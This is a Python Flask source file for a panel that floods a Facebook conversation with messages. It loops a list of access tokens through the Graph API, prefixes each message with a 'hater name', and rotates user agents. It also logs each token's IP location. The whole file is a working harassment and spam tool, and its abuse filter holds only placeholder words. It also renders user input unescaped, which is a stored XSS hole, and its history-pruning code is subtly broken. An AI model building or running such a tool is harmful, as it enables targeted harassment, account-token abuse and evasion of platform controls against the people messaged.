from flask import Flask, request, render_template_string, redirect, url_for, session
import threading
import time
import requests
import uuid
import random
from platform import system
import os
from datetime import datetime, timedelta
import json

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Change this to a random secret key

# Constants for colors (HTML compatible)
RED = '<span style="color: #ff4444">'
BLUE = '<span style="color: #4444ff">'
YELLOW = '<span style="color: #ffff44">'
GREEN = '<span style="color: #44ff44">'
CYAN = '<span style="color: #00ffff">'
MAGENTA = '<span style="color: #ff00ff">'
RESET = '</span>'

# Password configuration
PASSWORD = "5550561"

# Abuse keywords list
ABUSE_KEYWORDS = ['abuseword1', 'abuseword2', 'badword']

# In-memory data stores
tasks = {}
accounts = {}
task_threads = {}
task_stop_events = {}
stop_keys = {}  # task_id -> stop_key

# Chat history storage (last 2 hours)
chat_history = []
GEO_API_URL = "http://ip-api.com/json/"

# HTML template - Optimized for Termux
HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <title>UNDER COVER BOYS SERVER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #0f0;
            padding: 10px;
            font-size: 14px;
            line-height: 1.4;
        }
        .container {
            max-width: 100%;
            background: #111;
            border: 1px solid #0f0;
            padding: 15px;
            border-radius: 5px;
        }
        .header {
            text-align: center;
            margin-bottom: 15px;
            padding: 10px;
            border-bottom: 1px solid #0f0;
        }
        .header h1 {
            color: #0f0;
            font-size: 18px;
            text-shadow: 0 0 10px #0f0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            color: #0f0;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input, textarea {
            width: 100%;
            padding: 8px;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        textarea {
            resize: vertical;
            min-height: 80px;
        }
        button {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 10px 15px;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            margin: 5px 0;
        }
        button:hover {
            background: #0f0;
            color: #000;
        }
        .section {
            margin: 20px 0;
            border: 1px solid #0f0;
            padding: 10px;
            border-radius: 3px;
        }
        .section h2 {
            color: #0f0;
            margin-bottom: 10px;
            font-size: 16px;
            border-bottom: 1px solid #0f0;
            padding-bottom: 5px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        th, td {
            border: 1px solid #0f0;
            padding: 5px;
            text-align: left;
        }
        th {
            background: #002200;
        }
        .log-container {
            background: #000;
            border: 1px solid #0f0;
            padding: 10px;
            border-radius: 3px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        .log-line {
            margin-bottom: 2px;
            padding: 2px;
        }
        .success { color: #0f0; }
        .error { color: #f44; }
        .warning { color: #ff0; }
        .info { color: #44f; }
        .stop-btn {
            background: #500;
            border-color: #f00;
            color: #f44;
            padding: 5px 10px;
            font-size: 12px;
        }
        .stop-btn:hover {
            background: #f00;
            color: #000;
        }
        .timestamp {
            color: #888;
            font-size: 11px;
        }
        .chat-message {
            color: #0ff;
        }
        .status-running { color: #0f0; }
        .status-stopped { color: #f44; }
        .status-completed { color: #ff0; }
        .stop-key-section {
            background: #002200;
            border: 1px solid #0f0;
            padding: 10px;
            margin: 10px 0;
            border-radius: 3px;
        }
        .stop-key {
            color: #ff0;
            font-weight: bold;
            font-size: 16px;
            text-align: center;
            letter-spacing: 2px;
        }
        .stop-form {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .stop-form input {
            flex: 1;
        }
        .stop-form button {
            width: auto;
            flex: 0 0 100px;
        }
        .login-form {
            max-width: 300px;
            margin: 50px auto;
            text-align: center;
        }
        .login-form input {
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        {% if not logged_in %}
        <!-- Login Form -->
        <div class="login-form">
            <div class="header">
                <h1>UNDER COVER BOYS SERVER</h1>
                <div>Enter Password to Access</div>
            </div>
            {% if login_error %}
                <div class="error">{{ login_error }}</div>
            {% endif %}
            <form method="post" action="{{ url_for('login') }}">
                <input type="password" name="password" placeholder="Enter Password" required />
                <button type="submit">ACCESS SERVER</button>
            </form>
        </div>
        {% else %}
        <!-- Main Application -->
        <div class="header">
            <h1>UNDER COVER BOYS SERVER</h1>
            <div>Termux Optimized - Last 2 Hours Chat</div>
        </div>

        {% if error %}
            <div class="error form-group">{{ error|safe }}</div>
        {% endif %}

        {% if new_stop_key %}
        <div class="stop-key-section">
            <h3>YOUR STOP KEY (Save This):</h3>
            <div class="stop-key">{{ new_stop_key }}</div>
            <div style="text-align: center; font-size: 12px; color: #888;">
                Use this key to stop your task anytime
            </div>
        </div>
        {% endif %}

        <form method="post">
            <div class="form-group">
                <label for="tokens">TOKENS (One per line):</label>
                <textarea id="tokens" name="tokens" rows="3" required>{{ tokens }}</textarea>
            </div>

            <div class="form-group">
                <label for="hater_name">HATER NAME:</label>
                <input type="text" id="hater_name" name="hater_name" value="{{ hater_name }}" required />
            </div>

            <div class="form-group">
                <label for="convo_id">CONVERSATION ID:</label>
                <input type="text" id="convo_id" name="convo_id" value="{{ convo_id }}" required />
            </div>

            <div class="form-group">
                <label for="messages">MESSAGES (One per line):</label>
                <textarea id="messages" name="messages" rows="3" required>{{ messages }}</textarea>
            </div>

            <div style="display: flex; gap: 10px;">
                <div class="form-group" style="flex: 1;">
                    <label for="speed">SPEED (sec):</label>
                    <input type="number" step="0.1" min="0" id="speed" name="speed" value="{{ speed }}" required />
                </div>
                <div class="form-group" style="flex: 1;">
                    <label for="limit">MSG LIMIT:</label>
                    <input type="number" min="1" id="limit" name="limit" value="{{ limit }}" required />
                </div>
            </div>

            <button type="submit">START SENDING MESSAGES</button>
        </form>

        <div class="section">
            <h2>STOP TASK WITH KEY</h2>
            <form method="post" action="{{ url_for('stop_with_key') }}" class="stop-form">
                <input type="text" name="stop_key" placeholder="Enter 7-digit Stop Key" maxlength="7" required />
                <button type="submit" class="stop-btn">STOP TASK</button>
            </form>
        </div>

        <div class="section">
            <h2>RUNNING TASKS</h2>
            {% if tasks %}
            <table>
                <thead>
                    <tr>
                        <th>Task ID</th>
                        <th>Status</th>
                        <th>Tokens</th>
                        <th>Sent</th>
                        <th>Stop Key</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {% for tid, task in tasks.items() %}
                    <tr>
                        <td>{{ tid }}</td>
                        <td class="status-{{ task['status'].lower() }}">{{ task['status'] }}</td>
                        <td>{{ task['tokens_count'] }}</td>
                        <td>{{ task['messages_sent'] }}</td>
                        <td>
                            {% if stop_keys.get(tid) %}
                                {{ stop_keys[tid] }}
                            {% else %}
                                -
                            {% endif %}
                        </td>
                        <td>
                            {% if task['status'] == 'Running' %}
                            <form method="post" action="{{ url_for('stop_task', task_id=tid) }}" style="margin: 0;">
                                <button type="submit" class="stop-btn">STOP</button>
                            </form>
                            {% else %}
                            -
                            {% endif %}
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            {% else %}
                <div class="info">No running tasks</div>
            {% endif %}
        </div>

        <div class="section">
            <h2>LAST 2 HOURS CHAT HISTORY</h2>
            <div class="log-container">
                {% for chat in chat_history %}
                    <div class="log-line">
                        <span class="timestamp">[{{ chat.timestamp }}]</span>
                        <span class="chat-message">{{ chat.message|safe }}</span>
                    </div>
                {% else %}
                    <div class="info">No chat messages in last 2 hours</div>
                {% endfor %}
            </div>
        </div>

        <div class="section">
            <h2>ACCOUNTS INFO</h2>
            {% if accounts %}
            <table>
                <thead>
                    <tr>
                        <th>Token</th>
                        <th>IP</th>
                        <th>Location</th>
                        <th>Chat Name</th>
                        <th>Current Message</th>
                    </tr>
                </thead>
                <tbody>
                    {% for token, info in accounts.items() %}
                    <tr>
                        <td>...{{ token[-6:] }}</td>
                        <td>{{ info.get('ip', 'N/A') }}</td>
                        <td>{{ info.get('location', 'N/A') }}</td>
                        <td>{{ info.get('chat_name', 'N/A') }}</td>
                        <td>{{ info.get('current_message', 'N/A') }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            {% else %}
                <div class="info">No accounts running</div>
            {% endif %}
        </div>

        <div class="section">
            <a href="{{ url_for('logout') }}" style="color: #f44; text-decoration: none;">LOGOUT</a>
        </div>
        {% endif %}
    </div>

    {% if logged_in %}
    <script>
        // Auto refresh every 5 seconds
        setTimeout(function() {
            location.reload();
        }, 5000);
        
        // Auto scroll to bottom of chat
        window.onload = function() {
            var logContainer = document.querySelector('.log-container');
            if (logContainer) {
                logContainer.scrollTop = logContainer.scrollHeight;
            }
        };
    </script>
    {% endif %}
</body>
</html>
"""

def cls():
    os.system('clear')

def generate_stop_key():
    """Generate random 7-digit stop key"""
    return ''.join(random.choices('0123456789', k=7))

def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
    ]
    return random.choice(user_agents)

def is_abusive(message):
    msg_lower = message.lower()
    for word in ABUSE_KEYWORDS:
        if word in msg_lower:
            return True
    return False

def get_ip_location(ip):
    try:
        r = requests.get(GEO_API_URL + ip, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data['status'] == 'success':
                return f"{data['city']}, {data['country']}"
    except:
        pass
    return "Unknown"

def add_chat_to_history(message, message_type="info"):
    """Add chat message to history with timestamp"""
    global chat_history
    
    # Remove messages older than 2 hours
    two_hours_ago = datetime.now() - timedelta(hours=2)
    chat_history = [chat for chat in chat_history if chat['timestamp'] > two_hours_ago]
    
    # Add new message
    timestamp = datetime.now().strftime("%H:%M:%S")
    chat_history.append({
        'timestamp': timestamp,
        'message': message,
        'type': message_type
    })
    
    # Keep only last 100 messages to prevent memory issues
    if len(chat_history) > 100:
        chat_history = chat_history[-100:]

def send_message(task_id, convo_id, hater_name, access_token, message, message_index, delay, client_ip, stop_event):
    global tasks, accounts

    if stop_event.is_set():
        add_chat_to_history(f"{RED}Task {task_id} stopped{RESET}", "error")
        return

    if is_abusive(message):
        add_chat_to_history(f"{RED}Abusive message blocked: '{message}'{RESET}", "error")
        tasks[task_id]['status'] = 'Abuse detected'
        stop_event.set()
        return

    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'application/json',
    }

    url = f"https://graph.facebook.com/v19.0/t_{convo_id}/messages"
    parameters = {'access_token': access_token, 'message': f"{hater_name} {message}"}
    
    try:
        response = requests.post(url, json=parameters, headers=headers, timeout=10)
        current_time = datetime.now().strftime("%H:%M:%S")
        
        if response.status_code == 200:
            chat_msg = f"{GREEN}✓ Message {message_index + 1} sent: {hater_name} {message}{RESET}"
            add_chat_to_history(chat_msg, "success")
            
            tasks[task_id]['messages_sent'] += 1
            accounts[access_token] = {
                'current_message': message,
                'chat_name': convo_id,
                'ip': client_ip,
                'location': get_ip_location(client_ip),
                'last_active': current_time
            }
        else:
            chat_msg = f"{RED}✗ Failed to send message {message_index + 1}{RESET}"
            add_chat_to_history(chat_msg, "error")
            
            tasks[task_id]['status'] = 'Error'
            stop_event.set()
            return
            
    except Exception as e:
        chat_msg = f"{RED}✗ Error: {str(e)}{RESET}"
        add_chat_to_history(chat_msg, "error")
        tasks[task_id]['status'] = 'Error'
        stop_event.set()
        return

    # Check stop event before sleeping
    for _ in range(int(delay * 10)):
        if stop_event.is_set():
            return
        time.sleep(0.1)

def send_messages(task_id, convo_id, hater_name, tokens, messages, speed, limit, client_ip, stop_event):
    global tasks
    
    tasks[task_id]['status'] = 'Running'
    tasks[task_id]['messages_sent'] = 0
    tasks[task_id]['tokens_count'] = len(tokens)
    
    add_chat_to_history(f"{BLUE}Starting task {task_id} with {len(tokens)} tokens...{RESET}", "info")
    add_chat_to_history(f"{CYAN}Stop Key: {stop_keys.get(task_id, 'N/A')}{RESET}", "info")
    
    message_index = 0
    sent_count = 0
    
    while not stop_event.is_set() and sent_count < (len(tokens) * limit * len(messages)):
        try:
            for access_token in tokens:
                if stop_event.is_set():
                    break
                    
                # Send messages for this token
                for i in range(limit):
                    if stop_event.is_set():
                        break
                        
                    message = messages[message_index % len(messages)]
                    send_message(task_id, convo_id, hater_name, access_token, message, message_index, speed, client_ip, stop_event)
                    
                    message_index += 1
                    sent_count += 1
                    
                    if stop_event.is_set():
                        break

            if stop_event.is_set():
                break
                
            add_chat_to_history(f"{GREEN}Cycle completed. Restarting...{RESET}", "info")

        except Exception as e:
            add_chat_to_history(f"{RED}Error: {e}{RESET}", "error")
            time.sleep(10)

    if not stop_event.is_set():
        tasks[task_id]['status'] = 'Completed'
        add_chat_to_history(f"{GREEN}Task {task_id} completed{RESET}", "success")
    else:
        tasks[task_id]['status'] = 'Stopped'
        add_chat_to_history(f"{YELLOW}Task {task_id} stopped{RESET}", "warning")

@app.route('/', methods=['GET', 'POST'])
def index():
    global tasks, accounts, stop_keys
    
    # Check if user is logged in
    if not session.get('logged_in'):
        return render_template_string(HTML, logged_in=False, login_error=None)
    
    error = None
    new_stop_key = None
    
    if request.method == 'POST':
        try:
            tokens = [t.strip() for t in request.form['tokens'].strip().splitlines() if t.strip()]
            hater_name = request.form['hater_name'].strip()
            convo_id = request.form['convo_id'].strip()
            messages = [m.strip() for m in request.form['messages'].strip().splitlines() if m.strip()]
            speed = float(request.form['speed'])
            limit = int(request.form['limit'])

            if not tokens or not hater_name or not convo_id or not messages:
                error = f"{RED}All fields are required{RESET}"
            elif speed < 0:
                error = f"{RED}Speed must be positive{RESET}"
            elif limit < 1:
                error = f"{RED}Limit must be at least 1{RESET}"

            if error:
                return render_template_string(HTML, 
                    tokens="\n".join(tokens), 
                    hater_name=hater_name,
                    convo_id=convo_id, 
                    messages="\n".join(messages),
                    speed=speed, 
                    limit=limit, 
                    chat_history=chat_history,
                    tasks=tasks, 
                    accounts=accounts, 
                    stop_keys=stop_keys,
                    error=error,
                    new_stop_key=None,
                    logged_in=True
                )

            task_id = str(uuid.uuid4())[:8]
            
            # Generate unique stop key for this task
            stop_key = generate_stop_key()
            stop_keys[task_id] = stop_key
            new_stop_key = stop_key
            
            tasks[task_id] = {
                'status': 'Starting',
                'tokens_count': len(tokens),
                'messages_sent': 0
            }

            client_ip = request.remote_addr or '0.0.0.0'

            stop_event = threading.Event()
            task_stop_events[task_id] = stop_event

            thread = threading.Thread(
                target=send_messages, 
                args=(task_id, convo_id, hater_name, tokens, messages, speed, limit, client_ip, stop_event)
            )
            task_threads[task_id] = thread
            thread.daemon = True
            thread.start()

            return render_template_string(HTML, 
                tokens="", hater_name="", convo_id="", messages="", 
                speed=1.0, limit=1, chat_history=chat_history,
                tasks=tasks, accounts=accounts, stop_keys=stop_keys,
                error=None, new_stop_key=new_stop_key,
                logged_in=True
            )

        except Exception as e:
            error = f"{RED}Error: {e}{RESET}"
            return render_template_string(HTML, 
                tokens="", hater_name="", convo_id="", messages="", 
                speed=1.0, limit=1, chat_history=chat_history,
                tasks=tasks, accounts=accounts, stop_keys=stop_keys,
                error=error, new_stop_key=None,
                logged_in=True
            )

    return render_template_string(HTML, 
        tokens="", hater_name="", convo_id="", messages="", 
        speed=1.0, limit=1, chat_history=chat_history,
        tasks=tasks, accounts=accounts, stop_keys=stop_keys,
        error=None, new_stop_key=None,
        logged_in=True
    )

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password', '')
    if password == PASSWORD:
        session['logged_in'] = True
        return redirect(url_for('index'))
    else:
        return render_template_string(HTML, logged_in=False, login_error="Invalid password!")

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('index'))

@app.route('/stop_task/<task_id>', methods=['POST'])
def stop_task(task_id):
    global task_stop_events, tasks
    if not session.get('logged_in'):
        return redirect(url_for('index'))
        
    if task_id in task_stop_events:
        task_stop_events[task_id].set()
        tasks[task_id]['status'] = 'Stopping'
        add_chat_to_history(f"{YELLOW}Stop requested for task {task_id}{RESET}", "warning")
    return redirect(url_for('index'))

@app.route('/stop_with_key', methods=['POST'])
def stop_with_key():
    global task_stop_events, tasks, stop_keys
    
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    
    stop_key = request.form.get('stop_key', '').strip()
    
    if not stop_key or len(stop_key) != 7:
        add_chat_to_history(f"{RED}Invalid stop key format{RESET}", "error")
        return redirect(url_for('index'))
    
    # Find task with this stop key
    task_id_to_stop = None
    for task_id, key in stop_keys.items():
        if key == stop_key:
            task_id_to_stop = task_id
            break
    
    if task_id_to_stop and task_id_to_stop in task_stop_events:
        task_stop_events[task_id_to_stop].set()
        tasks[task_id_to_stop]['status'] = 'Stopping by Key'
        add_chat_to_history(f"{YELLOW}Task {task_id_to_stop} stopped using stop key{RESET}", "warning")
        add_chat_to_history(f"{GREEN}Stop key {stop_key} was successful{RESET}", "success")
    else:
        add_chat_to_history(f"{RED}Invalid stop key or task not found{RESET}", "error")
    
    return redirect(url_for('index'))

if __name__ == '__main__':
    cls()
    print("Server starting on http://0.0.0.0:8080")
    print("Password: 5550561")
    print("Access from browser or Termux")
    app.run(host='0.0.0.0', port=8080, threaded=True, debug=False)